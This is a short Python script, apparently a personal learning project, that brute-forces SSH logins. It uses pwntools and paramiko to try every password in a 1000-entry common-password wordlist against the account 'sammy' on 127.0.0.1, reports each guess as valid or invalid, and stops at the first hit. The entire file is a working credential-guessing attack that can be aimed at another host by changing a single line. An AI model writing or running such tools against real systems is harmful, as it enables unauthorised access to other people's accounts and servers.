from pwn import *
import paramiko

wordlistPath = "/tmp/python-projects/ssh-brute/wordlists/1000_common_passwords.txt"
host = "127.0.0.1"
user = "sammy"
port = 22

try:
	with open(wordlistPath, "r") as f:
		wordlist = f.readlines()
		wordlistLength = len(wordlist)
		counter = 1

		for passwd in wordlist:
			passwd = passwd.strip("\n")
			try:
				res = ssh(host=host, user=user, password=passwd)
				if(res.connect()):
					print("{a}/{b}. {c} => Valid.".format(a=counter, b=wordlistLength, c=passwd, timeout=1, level=0))
					res.close()
					break

			except paramiko.ssh_exception.AuthenticationException:
				print("{a}/{b}. {c} => Invalid.".format(a=counter, b=wordlistLength, c=passwd, timeout=1, level=0))

			counter += 1

except FileNotFoundError:
	print("[-] Error: Wordlist not found")